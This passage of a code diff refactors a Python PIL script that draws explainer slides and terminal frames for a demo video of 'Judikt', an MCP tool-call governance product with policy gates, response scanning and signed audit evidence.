+def _explainer_canvas() -> tuple[Image.Image, ImageDraw.ImageDraw]:
     image = Image.new("RGB", (WIDTH, HEIGHT), COLORS["background"])
     draw = ImageDraw.Draw(image)
     for y in range(HEIGHT):
         blend = y / HEIGHT
-        color = (
-            int(7 + 4 * blend),
-            int(17 + 9 * blend),
-            int(27 + 13 * blend),
-        )
+        color = (int(7 + 4 * blend), int(17 + 9 * blend), int(27 + 13 * blend))
         draw.line((0, y, WIDTH, y), fill=color)
-    for x in range(SIDEBAR_WIDTH, WIDTH, 64):
+    for x in range(0, WIDTH, 64):
         draw.line((x, 0, x, HEIGHT), fill="#0C1A26")
     for y in range(0, HEIGHT, 64):
-        draw.line((SIDEBAR_WIDTH, y, WIDTH, y), fill="#0C1A26")
+        draw.line((0, y, WIDTH, y), fill="#0C1A26")
     return image, draw
 
 
-def render_intro(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
-    image, draw = base_canvas()
+def _explainer_intro(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
+    image, draw = _explainer_canvas()
     _brand(draw, fonts)
     draw.rounded_rectangle(
         (72, 128, 1208, 592),
@@ -790,111 +433,81 @@ def render_intro(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
         outline=COLORS["border"],
         width=2,
     )
-    _pill(draw, (104, 166), "PRODUCTION MCP GOVERNANCE", fonts["small"], "green")
+    _pill(draw, (104, 166), "150-SECOND PRODUCT + LIVE RUNTIME DEMO", fonts["sans_small"], "green")
     draw.text(
         (104, 220),
-        "Every tool call gets a verdict.",
+        "Every MCP tool call gets a verdict.",
         font=fonts["hero"],
         fill=COLORS["text"],
     )
     draw.text(
         (106, 298),
-        "A real-runtime walkthrough of policy, approvals, response defense,\nand tamper-evident operations.",
+        "First understand the control plane. Then watch the real command,\n"
+        "processing path, MCP children, outputs, and signed evidence.",
         font=fonts["subtitle"],
         fill=COLORS["muted"],
         spacing=8,
     )
-    nodes = ["AI AGENT", "JUDIKT", "MCP TOOL", "SIGNED EVIDENCE"]
+    nodes = ("AI AGENT", "JUDIKT", "MCP TOOL", "SIGNED EVIDENCE")
+    widths = (190, 190, 190, 228)
     x = 104
-    for index, node in enumerate(nodes):
-        width = 190 if index != 3 else 228
-        fill = COLORS["green_dark"] if node == "JUDIKT" else COLORS["panel_alt"]
-        outline = COLORS["green"] if node == "JUDIKT" else COLORS["border"]
+    for index, (node, width) in enumerate(zip(nodes, widths)):
+        selected = node == "JUDIKT"
         draw.rounded_rectangle(
-            (x, 420, x + width, 478), radius=12, fill=fill, outline=outline, width=2
+            (x, 420, x + width, 478),
+            radius=12,
+            fill=COLORS["green_dark"] if selected else COLORS["panel_alt"],
+            outline=COLORS["green"] if selected else COLORS["border"],
+            width=2,
         )
-        _center_text(
-            draw, (x, 420, x + width, 478), node, fonts["small"], COLORS["text"]
-        )
+        _center_text(draw, (x, 420, x + width, 478), node, fonts["sans_small"], COLORS["text"])
         x += width
         if index < len(nodes) - 1:
-            draw.line((x + 13, 449, x + 47, 449), fill=COLORS["muted"], width=2)
-            draw.polygon(
-                ((x + 47, 449), (x + 39, 444), (x + 39, 454)), fill=COLORS["muted"]
-            )
+            _arrow(draw, x + 12, 449, x + 48, 449, COLORS["muted"])
             x += 60
     draw.text(
         (104, 532),
-        "9 controls  |  1 independent MCP fixture  |  0 external API calls",
+        "EXPLANATION WHERE CONTEXT MATTERS  |  TERMINAL WHERE PROOF MATTERS",
         font=fonts["mono_small"],
         fill=COLORS["green"],
     )
-    _timeline(draw, 0.0)
     return image
 
 
-def render_info_slide(
+def _info_slide(
     slide: InfoSlide,
     index: int,
     count: int,
     fonts: dict[str, ImageFont.FreeTypeFont],
 ) -> Image.Image:
-    image, draw = base_canvas()
+    image, draw = _explainer_canvas()
     _brand(draw, fonts)
-    _pill(draw, (72, 105), slide.eyebrow, fonts["small"], "green")
-    draw.text(
-        (72, 157),
-        slide.title,
-        font=fonts["hero_small"],
-        fill=COLORS["text"],
-    )
-    _wrapped_text(
-        draw,
-        slide.subtitle,
-        (74, 224),
-        1120,
-        fonts["subtitle"],
-        COLORS["muted"],
-        7,
-    )
+    _pill(draw, (72, 105), slide.eyebrow, fonts["sans_small"], "green")
+    draw.text((72, 157), slide.title, font=fonts["hero_small"], fill=COLORS["text"])
+    _wrapped_text(draw, slide.subtitle, (74, 224), 1120, fonts["subtitle"], COLORS["muted"], 7)
 
     card_width = 258
-    card_top = 326
-    card_bottom = 526
     for card_index, card in enumerate(slide.cards):
         x = 72 + card_index * 286
         draw.rounded_rectangle(
-            (x, card_top, x + card_width, card_bottom),
+            (x, 326, x + card_width, 526),
             radius=18,
             fill=COLORS["panel"],
             outline=COLORS[card.accent],
             width=2,
         )
-        draw.text(
-            (x + 22, card_top + 24),
-            card.heading,
-            font=fonts["tiny"],
-            fill=COLORS[card.accent],
-        )
+        draw.text((x + 22, 350), card.heading, font=fonts["tiny"], fill=COLORS[card.accent])
         _wrapped_text(
             draw,
             card.body,
-            (x + 22, card_top + 64),
+            (x + 22, 390),
             card_width - 44,
             fonts["body"],
             COLORS["text"],
             7,
         )
         if card_index < len(slide.cards) - 1:
-            arrow_x = x + card_width + 14
-            draw.polygon(
-                (
-                    (arrow_x + 5, 420),
-                    (arrow_x - 3, 414),
-                    (arrow_x - 3, 426),
-                ),
-                fill=COLORS["muted"],
-            )
+            _arrow(draw, x + card_width + 10, 420, x + card_width + 28, 420, COLORS["muted"])
 
     draw.rounded_rectangle(
         (72, 562, 1208, 646),
@@ -904,441 +517,220 @@ def render_info_slide(
         width=2,
     )
     draw.text((96, 579), "WHY IT MATTERS", font=fonts["tiny"], fill=COLORS["green"])
-    _wrapped_text(
+    _wrapped_text(draw, slide.takeaway, (96, 603), 1088, fonts["body"], COLORS["text"], 6)
+    draw.text(
+        (1208, 682),
+        f"CONTEXT {index:02d} / {count:02d}",
+        anchor="ra",
+        font=fonts["mono_small"],
+        fill=COLORS["muted"],
+    )
+    return image
+
+
+def _architecture_slide(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
+    image, draw = _explainer_canvas()
+    _brand(draw, fonts)
+    _pill(draw, (72, 105), "CONCEPTUAL END-TO-END FLOW", fonts["sans_small"], "green")
+    draw.text((72, 157), "One guarded path in both directions", font=fonts["hero_small"], fill=COLORS["text"])
+    draw.text(
+        (74, 224),
+        "This explains the control boundaries. The next chapters prove them with captured terminal output.",
+        font=fonts["subtitle"],
+        fill=COLORS["muted"],
+    )
+
+    nodes = (
+        (72, 300, 250, 382, "AI AGENT", "intent + identity", "blue"),
+        (302, 278, 528, 404, "REQUEST GATE", "auth | policy | risk\napproval | rate | kill", "amber"),
+        (580, 300, 758, 382, "MCP SERVER", "scoped execution", "purple"),
+        (810, 278, 1036, 404, "RESPONSE GATE", "pin | injection scan\nquarantine | redact", "red"),
+        (1088, 300, 1208, 382, "AGENT", "safe result", "green"),
+    )
+    for left, top, right, bottom, heading, detail, accent in nodes:
+        draw.rounded_rectangle(
+            (left, top, right, bottom),
+            radius=16,
+            fill=COLORS[f"{accent}_dark"],
+            outline=COLORS[accent],
+            width=2,
+        )
+        _center_text(draw, (left, top + 10, right, top + 48), heading, fonts["sans_small"], COLORS[accent])
+        _center_text(draw, (left + 8, top + 43, right - 8, bottom - 6), detail, fonts["tiny"], COLORS["text"])
+    for start, end in ((250, 302), (528, 580), (758, 810), (1036, 1088)):
+        _arrow(draw, start + 8, 341, end - 8, 341, COLORS["muted"])
+
+    draw.line((415, 425, 415, 486), fill=COLORS["green"], width=2)
+    draw.line((923, 425, 923, 486), fill=COLORS["green"], width=2)
+    draw.line((415, 486, 923, 486), fill=COLORS["green"], width=2)
+    draw.polygon(((669, 500), (661, 488), (677, 488)), fill=COLORS["green"])
+    draw.rounded_rectangle(
+        (350, 510, 988, 614),
+        radius=18,
+        fill=COLORS["green_dark"],
+        outline=COLORS["green"],
+        width=2,
+    )
+    _center_text(draw, (350, 518, 988, 558), "CORRELATED OPERATIONAL EVIDENCE", fonts["sans_small"], COLORS["green"])
+    _center_text(
         draw,
-        slide.takeaway,
-        (96, 603),
-        1088,
+        (370, 555, 968, 604),
+        "signed audit | Prometheus | OpenTelemetry | findings | SIEM",
         fonts["body"],
         COLORS["text"],
-        6,
     )
-    draw.text(
-        (1208, 682),
-        f"CONTEXT {index + 1:02d} / {count:02d}",
-        anchor="ra",
-        font=fonts["mono_small"],
-        fill=COLORS["muted"],
-    )
-    _timeline(draw, (index + 1) / (count + 11))
     return image
 
 
-def render_runtime_flow(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
-    image, draw = base_canvas()
+def _terminal_transition(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
+    image, draw = _explainer_canvas()
     _brand(draw, fonts)
-    _pill(draw, (72, 105), "ACTUAL COMMAND AND STACK", fonts["small"], "green")
+    _pill(draw, (72, 112), "CONTEXT COMPLETE", fonts["sans_small"], "green")
+    draw.text((72, 180), "Now prove it in the terminal.", font=fonts["hero"], fill=COLORS["text"])
     draw.text(
-        (72, 157),
-        "From Python call to backend and evidence",
-        font=fonts["hero_small"],
-        fill=COLORS["text"],
-    )
-    draw.text(
-        (74, 224),
-        "These are the real entrypoints, process command, protocol method, and modules used by this recording.",
+        (74, 266),
+        "From this point forward, every command, input, processing step, backend path,\n"
+        "verdict, output, metric, and audit result comes from captured live stdout.",
         font=fonts["subtitle"],
         fill=COLORS["muted"],
+        spacing=8,
     )
-
     draw.rounded_rectangle(
-        (72, 276, 548, 642),
-        radius=18,
-        fill="#071019",
+        (72, 382, 1208, 570),
+        radius=20,
+        fill="#081019",
         outline=COLORS["border"],
         width=2,
     )
-    draw.rectangle((72, 276, 548, 320), fill=COLORS["panel_alt"])
-    draw.ellipse((94, 292, 104, 302), fill=COLORS["red"])
-    draw.ellipse((112, 292, 122, 302), fill=COLORS["amber"])
-    draw.ellipse((130, 292, 140, 302), fill=COLORS["green"])
-    draw.text((162, 289), "recording process", font=fonts["tiny"], fill=COLORS["muted"])
     terminal_lines = (
-        ("$ make demo-recording", "green"),
-        ("PYTHONPATH=src ./scripts/python.sh", "muted"),
-        ("  scripts/record_demo.py", "muted"),
-        ("", "muted"),
-        ("runtime.call_tool(", "blue"),
-        ('  "platform-ops", "platform.health",', "text"),
-        ('  {"service": "payments-api"}', "text"),
-        (")", "blue"),
-        ("", "muted"),
-        ("spawn  python -m judikt.cli", "amber"),
-        ("       backend platform-ops", "amber"),
-        ("rpc    JSON-RPC tools/call", "purple"),
+        "$ ./scripts/run_demo.sh --policy $TMP/policy.json --audit-db $TMP/audit.db",
+        "[process] launch Judikt + isolated stdio MCP child processes",
+        "[proof] inputs -> controls -> backend execution/skip -> output -> evidence",
     )
-    y = 340
-    for line, color in terminal_lines:
-        draw.text((96, y), line, font=fonts["mono_small"], fill=COLORS[color])
-        y += 23
-
-    draw.rounded_rectangle(
-        (580, 276, 1208, 642),
-        radius=18,
-        fill=COLORS["panel"],
-        outline=COLORS["border"],
-        width=2,
-    )
-    draw.text(
-        (604, 296), "EXECUTED CALL PATH", font=fonts["tiny"], fill=COLORS["green"]
-    )
-    nodes = (
-        ("01", "JudiktRuntime.call_tool", "runtime.py", "blue"),
-        ("02", "PolicyEngine.evaluate", "policy.py", "amber"),
-        ("03", "StdioMCPClient.call_tool", "protocol.py", "purple"),
-        ("04", "JSON-RPC tools/call", "child stdin / stdout", "blue"),
-        ("05", "PlatformOpsBackend.call", "backends.py / demo state", "amber"),
-        (
-            "06",
-            "ContentGuard -> AuditStore",
-            "scan + redact -> SQLite + metrics",
-            "green",
-        ),
-    )
-    y = 330
-    for node_index, (number, heading, detail, accent) in enumerate(nodes):
-        draw.rounded_rectangle(
-            (604, y, 1184, y + 42),
-            radius=10,
-            fill=COLORS[f"{accent}_dark"],
-            outline=COLORS[accent],
-            width=1,
+    for index, line in enumerate(terminal_lines):
+        draw.text(
+            (104, 422 + index * 48),
+            line,
+            font=fonts["mono"],
+            fill=COLORS["green"] if index == 0 else COLORS["text"],
         )
-        draw.text((620, y + 13), number, font=fonts["mono_small"], fill=COLORS[accent])
-        draw.text((660, y + 11), heading, font=fonts["small"], fill=COLORS["text"])
-        _right_text(draw, (1166, y + 25), detail, fonts["tiny"], COLORS["muted"])
-        if node_index < len(nodes) - 1:
-            draw.line((894, y + 42, 894, y + 53), fill=COLORS["muted"], width=1)
-            draw.polygon(
-                ((894, y + 55), (889, y + 49), (899, y + 49)), fill=COLORS["muted"]
-            )
-        y += 52
-    draw.text(
-        (1208, 682),
-        "FLOW 01 / 02",
-        anchor="ra",
-        font=fonts["mono_small"],
-        fill=COLORS["muted"],
-    )
-    _timeline(draw, 0.42)
     return image
 
 
-def render_verdict_branches(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
-    image, draw = base_canvas()
+def _explainer_outro(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
+    image, draw = _explainer_canvas()
     _brand(draw, fonts)
-    _pill(draw, (72, 105), "RUNTIME BRANCHES", fonts["small"], "green")
+    _pill(draw, (72, 112), "END-TO-END WALKTHROUGH COMPLETE", fonts["sans_small"], "green")
+    draw.text((72, 180), "Understand it. Run it. Verify it.", font=fonts["hero"], fill=COLORS["text"])
     draw.text(
-        (72, 157),
-        "What the backend does for each verdict",
-        font=fonts["hero_small"],
-        fill=COLORS["text"],
-    )
-    draw.text(
-        (74, 224),
-        "A deny or evaluation-only result stops before tools/call; quarantine happens after a backend response.",
+        (74, 270),
+        "Judikt turns agent-proposed MCP actions into deterministic, bounded,\n"
+        "observable production operations.",
         font=fonts["subtitle"],
         fill=COLORS["muted"],
+        spacing=8,
     )
-    branches = (
-        (
-            "ALLOW",
-            "green",
-            (
-                "policy allows",
-                "JSON-RPC tools/call",
-                "backend handles call",
-                "scan -> result + audit",
-            ),
-        ),
-        (
-            "DENY",
-            "red",
-            (
-                "policy blocks",
-                "no tools/call sent",
-                "backend untouched",
-                "blocked event audited",
-            ),
-        ),
-        (
-            "DRY RUN",
-            "purple",
-            (
-                "DRY_RUN_ONLY",
-                "MCP execution skipped",
-                "synthetic safe result",
-                "evaluation audited",
-            ),
-        ),
-        (
-            "QUARANTINE",
-            "amber",
-            (
-                "policy allows",
-                "backend returns text",
-                "ContentGuard blocks",
-                "text withheld + finding",
-            ),
-        ),
-    )
-    y = 292
-    for label, accent, steps in branches:
-        draw.rounded_rectangle(
-            (72, y, 218, y + 68),
-            radius=14,
-            fill=COLORS[f"{accent}_dark"],
-            outline=COLORS[accent],
-            width=2,
-        )
-        _center_text(draw, (72, y, 218, y + 68), label, fonts["small"], COLORS[accent])
-        for step_index, step in enumerate(steps):
-            x = 246 + step_index * 240
-            draw.rounded_rectangle(
-                (x, y, x + 210, y + 68),
-                radius=12,
-                fill=COLORS["panel"],
-                outline=COLORS["border"],
-                width=1,
-            )
-            _center_text(
-                draw, (x + 8, y, x + 202, y + 68), step, fonts["small"], COLORS["text"]
-            )
-            if step_index < len(steps) - 1:
-                arrow_x = x + 225
-                draw.line(
-                    (x + 210, y + 34, arrow_x, y + 34), fill=COLORS[accent], width=2
-                )
-                draw.polygon(
-                    (
-                        (arrow_x + 5, y + 34),
-                        (arrow_x - 2, y + 29),
-                        (arrow_x - 2, y + 39),
-                    ),
-                    fill=COLORS[accent],
-                )
-        y += 84
-    draw.text(
-        (72, 652),
-        "Backend invocation is a consequence of the verdict, not proof that policy was evaluated.",
-        font=fonts["mono_small"],
-        fill=COLORS["green"],
-    )
-    draw.text(
-        (1208, 682),
-        "FLOW 02 / 02",
-        anchor="ra",
-        font=fonts["mono_small"],
-        fill=COLORS["muted"],
-    )
-    _timeline(draw, 0.47)
-    return image
-
-
-def render_scene(
-    scene: Scene,
-    scenes: list[Scene],
-    fonts: dict[str, ImageFont.FreeTypeFont],
-    *,
-    phase: int,
-) -> Image.Image:
-    image, draw = base_canvas()
-    _sidebar(draw, scene, scenes, fonts)
-    _brand(draw, fonts, compact=True)
-    _pill(draw, (330, 82), scene.eyebrow, fonts["tiny"], scene.accent)
-    draw.text((330, 118), scene.title, font=fonts["title"], fill=COLORS["text"])
-    _wrapped_text(
-        draw, scene.subtitle, (332, 166), 850, fonts["subtitle"], COLORS["muted"], 6
-    )
-
     draw.rounded_rectangle(
-        (330, 224, 1218, 319),
-        radius=16,
-        fill=COLORS["panel"],
-        outline=COLORS["border"],
-        width=2,
-    )
-    draw.text((354, 245), "AGENT INTENT", font=fonts["tiny"], fill=COLORS["muted"])
-    draw.text((354, 269), scene.intent, font=fonts["body"], fill=COLORS["text"])
-    draw.text((936, 245), "MCP ROUTE", font=fonts["tiny"], fill=COLORS["muted"])
-    _right_text(draw, (1192, 270), scene.tool, fonts["mono_small"], COLORS["blue"])
-
-    draw.text((330, 350), "CONTROL PIPELINE", font=fonts["tiny"], fill=COLORS["muted"])
-    check_width = 276
-    for index, check in enumerate(scene.checks):
-        x = 330 + index * (check_width + 20)
-        active = phase >= 1
-        fill = COLORS[f"{scene.accent}_dark"] if active else COLORS["panel"]
-        outline = COLORS[scene.accent] if active else COLORS["border"]
-        draw.rounded_rectangle(
-            (x, 376, x + check_width, 426),
-            radius=12,
-            fill=fill,
-            outline=outline,
-            width=2,
-        )
-        marker = "OK" if active else ".."
-        draw.text((x + 14, 393), marker, font=fonts["mono_small"], fill=outline)
-        draw.text(
-            (x + 48, 392),
-            check,
-            font=fonts["small"],
-            fill=COLORS["text"] if active else COLORS["muted"],
-        )
-
-    decision_y = 454
-    if phase < 2:
-        draw.rounded_rectangle(
-            (330, decision_y, 1218, 634),
-            radius=18,
-            fill=COLORS["panel"],
-            outline=COLORS["border"],
-            width=2,
-        )
-        status = "REQUEST RECEIVED" if phase == 0 else "EVALUATING CONTROLS"
-        draw.text((360, 486), status, font=fonts["metric"], fill=COLORS["muted"])
-        draw.text(
-            (360, 538),
-            "No upstream execution occurs until the pipeline resolves.",
-            font=fonts["body"],
-            fill=COLORS["muted"],
-        )
-    else:
-        accent = COLORS[scene.accent]
-        dark = COLORS[f"{scene.accent}_dark"]
-        draw.rounded_rectangle(
-            (330, decision_y, 1218, 634), radius=18, fill=dark, outline=accent, width=2
-        )
-        draw.text((356, 476), scene.decision, font=fonts["metric"], fill=accent)
-        _pill(draw, (700, 480), f"RULE  {scene.rule}", fonts["tiny"], scene.accent)
-        _pill(draw, (1000, 480), f"RISK  {scene.risk}", fonts["tiny"], scene.accent)
-        draw.line((356, 526, 1192, 526), fill=COLORS["border"], width=1)
-        for index, line in enumerate(scene.result_lines):
-            x = 356 + (index % 2) * 418
-            y = 548 + (index // 2) * 31
-            draw.text((x, y), line, font=fonts["mono_small"], fill=COLORS["text"])
-        draw.text((356, 608), scene.evidence, font=fonts["tiny"], fill=COLORS["muted"])
-
-    draw.text(
-        (330, 660), scene.evidence, font=fonts["mono_small"], fill=COLORS["muted"]
-    )
-    draw.text(
-        (1218, 660),
-        f"{scene.number:02d} / {len(scenes):02d}",
-        anchor="ra",
-        font=fonts["mono_small"],
-        fill=COLORS["muted"],
-    )
-    progress = ((scene.number - 1) * 3 + phase + 1) / (len(scenes) * 3 + 2)
-    _timeline(draw, progress)
-    return image
-
-
-def render_outro(
-    scenes: list[Scene], fonts: dict[str, ImageFont.FreeTypeFont]
-) -> Image.Image:
-    image, draw = base_canvas()
-    _brand(draw, fonts)
-    _pill(draw, (72, 112), "END-TO-END VERIFIED", fonts["small"], "green")
-    draw.text(
-        (72, 164),
-        "Production controls, visible outcomes.",
-        font=fonts["hero"],
-        fill=COLORS["text"],
-    )
-    draw.text(
-        (74, 238),
-        "The recording was rendered from the same runtime paths used by the test suite.",
-        font=fonts["subtitle"],
-        fill=COLORS["muted"],
-    )
-    cards = [
-        ("REQUEST", "Policy + identity\nRisk + rate limits", "blue"),
-        ("EXECUTION", "Approval + dry run\nKill switches", "amber"),
-        ("RESPONSE", "Injection scan\nSecret redaction", "red"),
-        ("EVIDENCE", "Signed audit\nMetrics + correlation", "green"),
-    ]
-    for index, (heading, body, accent) in enumerate(cards):
-        x = 72 + index * 286
-        draw.rounded_rectangle(
-            (x, 320, x + 258, 498),
-            radius=18,
-            fill=COLORS["panel"],
-            outline=COLORS[accent],
-            width=2,
-        )
-        draw.text((x + 22, 344), heading, font=fonts["tiny"], fill=COLORS[accent])
-        draw.multiline_text(
-            (x + 22, 386), body, font=fonts["body"], fill=COLORS["text"], spacing=10
-        )
-    draw.rounded_rectangle(
-        (72, 548, 1208, 621),
-        radius=16,
+        (72, 390, 1208, 560),
+        radius=20,
         fill=COLORS["green_dark"],
         outline=COLORS["green"],
         width=2,
     )
     _center_text(
         draw,
-        (72, 548, 1208, 621),
-        f"{len(scenes) - 1} GUARDED CALLS + 1 INTEGRITY CHECK  |  "
-        "REPRODUCE: make demo-recording",
-        fonts["mono"],
+        (96, 405, 1184, 475),
+        "POLICY-GATED EXECUTION | UNTRUSTED RESPONSE DEFENSE | SIGNED EVIDENCE",
+        fonts["sans_small"],
         COLORS["green"],
     )
-    _timeline(draw, 1.0)
+    _center_text(
+        draw,
+        (96, 476, 1184, 542),
+        "Reproduce the complete media artifact:  make demo-recording",
+        fonts["mono"],
+        COLORS["text"],
+    )
     return image
 
 
-def _brand(
-    draw: ImageDraw.ImageDraw,
-    fonts: dict[str, ImageFont.FreeTypeFont],
-    compact: bool = False,
-) -> None:
-    x = 330 if compact else 72
-    y = 30
-    draw.rounded_rectangle((x, y, x + 42, y + 42), radius=10, fill=COLORS["green"])
-    _center_text(draw, (x, y, x + 42, y + 42), "J", fonts["body"], COLORS["background"])
-    draw.text((x + 56, y + 5), "JUDIKT", font=fonts["brand"], fill=COLORS["text"])
-    if not compact:
-        draw.text(
-            (x + 214, y + 13),
-            "MCP SECURITY CONTROL PLANE",
-            font=fonts["tiny"],
-            fill=COLORS["muted"],
-        )
+def _typing_steps(length: int) -> list[int]:
+    if length <= 1:
+        return [length]
+    count = 9
+    return sorted({max(1, round(length * index / count)) for index in range(1, count + 1)})
 
 
-def _sidebar(
-    draw: ImageDraw.ImageDraw,
-    active: Scene,
-    scenes: list[Scene],
+def _reveal_steps(length: int) -> list[int]:
+    if length <= 1:
+        return [length]
+    count = min(5, max(2, (length + 4) // 5))
+    return sorted({max(1, round(length * index / count)) for index in range(1, count + 1)})
+
+
+def _terminal_frame(
+    title: str,
+    lines: list[str],
     fonts: dict[str, ImageFont.FreeTypeFont],
-) -> None:
-    draw.rectangle((0, 0, SIDEBAR_WIDTH, HEIGHT), fill="#081622")
-    draw.line((SIDEBAR_WIDTH, 0, SIDEBAR_WIDTH, HEIGHT), fill=COLORS["border"], width=2)
-    draw.text((30, 36), "CONTROL WALKTHROUGH", font=fonts["tiny"], fill=COLORS["muted"])
-    y = 82
-    for scene in scenes:
-        selected = scene.number == active.number
-        if selected:
-            draw.rounded_rectangle(
-                (18, y - 10, 274, y + 40),
-                radius=11,
-                fill=COLORS[f"{scene.accent}_dark"],
-            )
-            draw.rectangle((18, y - 2, 22, y + 32), fill=COLORS[scene.accent])
-        number_color = COLORS[scene.accent] if selected else COLORS["muted"]
-        text_color = COLORS["text"] if selected else COLORS["muted"]
-        draw.text(
-            (36, y), f"{scene.number:02d}", font=fonts["mono_small"], fill=number_color
-        )
-        draw.text((72, y), scene.nav_title, font=fonts["small"], fill=text_color)
-        y += 58
-    draw.text((30, 640), "REAL RUNTIME DATA", font=fonts["tiny"], fill=COLORS["green"])
+    page: int,
+    page_count: int,
+) -> Image.Image:
+    image = Image.new("RGB", (WIDTH, HEIGHT), BACKGROUND)
+    draw = ImageDraw.Draw(image)
+    draw.rounded_rectangle((18, 18, WIDTH - 18, HEIGHT - 18), radius=13, fill=PANEL, outline=BORDER, width=2)
+    draw.rounded_rectangle((18, 18, WIDTH - 18, 68), radius=13, fill=TITLEBAR)
+    draw.rectangle((18, 52, WIDTH - 18, 68), fill=TITLEBAR)
+    for x, color in ((43, RED), (67, AMBER), (91, GREEN)):
+        draw.ellipse((x - 7, 36 - 7, x + 7, 36 + 7), fill=color)
+    draw.text((WIDTH // 2, 36), f"Judikt | {title}", font=fonts["terminal_title"], fill=MUTED, anchor="mm")
+
+    y = 88
+    for line in lines[-MAX_ROWS:]:
+        draw.text((42, y), line, font=fonts["mono"], fill=_line_color(line))
+        y += LINE_HEIGHT
+
+    draw.rectangle((18, HEIGHT - 48, WIDTH - 18, HEIGHT - 18), fill=TITLEBAR)
+    draw.text((40, HEIGHT - 34), "LIVE CAPTURED STDOUT", font=fonts["small"], fill=GREEN, anchor="lm")
     draw.text(
-        (30, 665),
-        "No cloud calls. No secrets.",
+        (WIDTH - 40, HEIGHT - 34),
+        f"page {page:02d}/{page_count:02d} | major output hold 5s",
+        font=fonts["small"],
+        fill=MUTED,
+        anchor="rm",
+    )
+    return image
+
+
+def _line_color(line: str) -> str:
+    lowered = line.lower()
+    if line.startswith("##") or line.startswith("JUDIKT"):
+        return BLUE
+    if line.startswith("$") or line.startswith("gaurav@"):
+        return GREEN
+    if "quarantine" in lowered or "deny" in lowered or "allowed=false" in lowered:
+        return RED
+    if "require_approval" in lowered or "dry_run" in lowered or "risk=critical" in lowered:
+        return AMBER
+    if "pass" in lowered or "allowed=true" in lowered or "valid=true" in lowered:
+        return GREEN
+    if line.startswith("PROCESS") or line.startswith("OUTPUT") or "->" in line:
+        return PURPLE
+    if line.startswith("["):
+        return MUTED
+    return TEXT
+
+
+def _palette(frame: Image.Image) -> Image.Image:
+    return frame.convert("P", palette=Image.Palette.ADAPTIVE, colors=64)
+
+
+def _brand(draw: ImageDraw.ImageDraw, fonts: dict[str, ImageFont.FreeTypeFont]) -> None:
+    draw.rounded_rectangle((72, 30, 114, 72), radius=10, fill=COLORS["green"])
+    _center_text(draw, (72, 30, 114, 72), "J", fonts["body"], COLORS["background"])
+    draw.text((128, 35), "JUDIKT", font=fonts["brand"], fill=COLORS["text"])
+    draw.text(
+        (286, 45),
+        "MCP SECURITY CONTROL PLANE",
         font=fonts["tiny"],
         fill=COLORS["muted"],
     )
@@ -1352,58 +744,49 @@ def _pill(
     accent: str,
 ) -> None:
     x, y = position
-    box = draw.textbbox((0, 0), label, font=font)
-    width = box[2] - box[0] + 26
-    height = 30
+    bounds = draw.textbbox((0, 0), label, font=font)
+    width = bounds[2] - bounds[0] + 26
     draw.rounded_rectangle(
-        (x, y, x + width, y + height),
+        (x, y, x + width, y + 30),
         radius=15,
         fill=COLORS[f"{accent}_dark"],
         outline=COLORS[accent],
         width=1,
     )
-    _center_text(draw, (x, y, x + width, y + height), label, font, COLORS[accent])
+    _center_text(draw, (x, y, x + width, y + 30), label, font, COLORS[accent])
 
 
 def _center_text(
     draw: ImageDraw.ImageDraw,
     box: tuple[int, int, int, int],
-    text: str,
+    value: str,
     font: ImageFont.FreeTypeFont,
     fill: str,
 ) -> None:
     left, top, right, bottom = box
-    bounds = draw.textbbox((0, 0), text, font=font)
+    bounds = draw.multiline_textbbox((0, 0), value, font=font, spacing=4, align="center")
     width = bounds[2] - bounds[0]
     height = bounds[3] - bounds[1]
-    draw.text(
+    draw.multiline_text(
         ((left + right - width) / 2, (top + bottom - height) / 2 - bounds[1]),
-        text,
+        value,
         font=font,
         fill=fill,
+        spacing=4,
+        align="center",
     )
-
-
-def _right_text(
-    draw: ImageDraw.ImageDraw,
-    position: tuple[int, int],
-    text: str,
-    font: ImageFont.FreeTypeFont,
-    fill: str,
-) -> None:
-    draw.text(position, text, anchor="ra", font=font, fill=fill)
 
 
 def _wrapped_text(
     draw: ImageDraw.ImageDraw,
-    text: str,
+    value: str,
     position: tuple[int, int],
     max_width: int,
     font: ImageFont.FreeTypeFont,
     fill: str,
     spacing: int,
 ) -> None:
-    words = text.split()
+    words = value.split()
     lines: list[str] = []
     current = ""
     for word in words:
@@ -1416,38 +799,74 @@ def _wrapped_text(
             current = word
     if current:
         lines.append(current)
-    draw.multiline_text(
-        position, "\n".join(lines), font=font, fill=fill, spacing=spacing
-    )
+    draw.multiline_text(position, "\n".join(lines), font=font, fill=fill, spacing=spacing)
 
 
-def _timeline(draw: ImageDraw.ImageDraw, progress: float) -> None:
-    draw.rectangle((0, HEIGHT - 6, WIDTH, HEIGHT), fill="#10202D")
-    draw.rectangle(
-        (0, HEIGHT - 6, int(WIDTH * max(0.0, min(progress, 1.0))), HEIGHT),
-        fill=COLORS["green"],
+def _arrow(
+    draw: ImageDraw.ImageDraw,
+    start_x: int,
+    start_y: int,
+    end_x: int,
+    end_y: int,
+    fill: str,
+) -> None:
+    draw.line((start_x, start_y, end_x - 7, end_y), fill=fill, width=2)
+    draw.polygon(((end_x, end_y), (end_x - 8, end_y - 5), (end_x - 8, end_y + 5)), fill=fill)
+
+
+def _load_fonts() -> dict[str, ImageFont.FreeTypeFont]:
+    mono_candidates = (
+        Path("/System/Library/Fonts/Menlo.ttc"),
+        Path("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"),
     )
+    sans_candidates = (
+        Path("/System/Library/Fonts/HelveticaNeue.ttc"),
+        Path("/System/Library/Fonts/Helvetica.ttc"),
+        Path("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"),
+    )
+    mono_path = next((path for path in mono_candidates if path.exists()), None)
+    sans_path = next((path for path in sans_candidates if path.exists()), None)
+    if mono_path is None or sans_path is None:
+        raise SystemExit("Supported monospaced and sans-serif fonts are required")
+    return {
+        "mono": ImageFont.truetype(str(mono_path), 18),
+        "mono_small": ImageFont.truetype(str(mono_path), 13),
+        "small": ImageFont.truetype(str(mono_path), 14),
+        "terminal_title": ImageFont.truetype(str(mono_path), 15),
+        "brand": ImageFont.truetype(str(sans_path), 30),
+        "hero": ImageFont.truetype(str(sans_path), 52),
